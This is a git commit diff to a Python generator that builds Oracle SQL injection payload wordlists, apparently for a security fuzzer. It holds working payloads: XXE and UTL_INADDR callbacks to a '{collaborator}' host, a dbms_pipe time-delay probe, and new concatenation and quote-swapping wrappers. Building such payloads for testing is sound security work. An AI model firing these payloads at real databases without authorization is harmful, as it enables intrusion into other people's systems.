7fcf397d47cc243a5168de93dfa8d59c1b0eca5a
s0x6fup <markmark0455@gmail.com>
2022-12-31 21:49:38 +0200

    asdff

--- lib/sqlInjectionOracle.py
+++ lib/sqlInjectionOracle.py
@@ -28,14 +28,31 @@ suffixes = [
 ]
 
 templates = [
-    'SELECT EXTRACTVALUE(xmltype("<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{collaborator}/"> %remote;]>"),"/l") FROM dual',
+    'SELECT EXTRACTVALUE(xmltype(\'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{collaborator}/"> %remote;]>\'),\'/l\') FROM dual',
     'SELECT UTL_INADDR.get_host_address("{collaborator}")',
-    'dbms_pipe.receive_message(("a"),{time})'
+    '123=dbms_pipe.receive_message(("a"),{time})'
 ]
 
 
+concats = [
+    ['"||', '||"'],
+    ['"||(', ')||"'],
+    ['||(', '']
+]
+
 def generate():
     wordlist = []
+
+    # injection via string concatination
+    # - can concat int and str due to 'implicit' conversion
+    # - TODO: test if you can do this even if this causes an error with ints
+    for concat in concats:
+        for template in templates:
+            word = concat[0] + template + concat[1]
+            wordlist.append(word)
+
+            word = concat[0].replace('"', '\'') + template + concat[1].replace('"', '\'')
+            wordlist.append(word)
 
     # injection via operators
     for prefix in prefixes:
@@ -44,9 +61,8 @@ def generate():
                 for suffix in suffixes:
                     word = prefix + sqlOperator + template + suffix
                     wordlist.append(word)
-                    wordlist.append(word.replace('"', '\''))
+                    word = prefix.replace('"', '\'') + sqlOperator + template + suffix.replace('"', '\'')
+                    wordlist.append(word)
     
-    # injection via string concatination
-    # TODO
     wordlist = list(set(wordlist))
     return wordlist
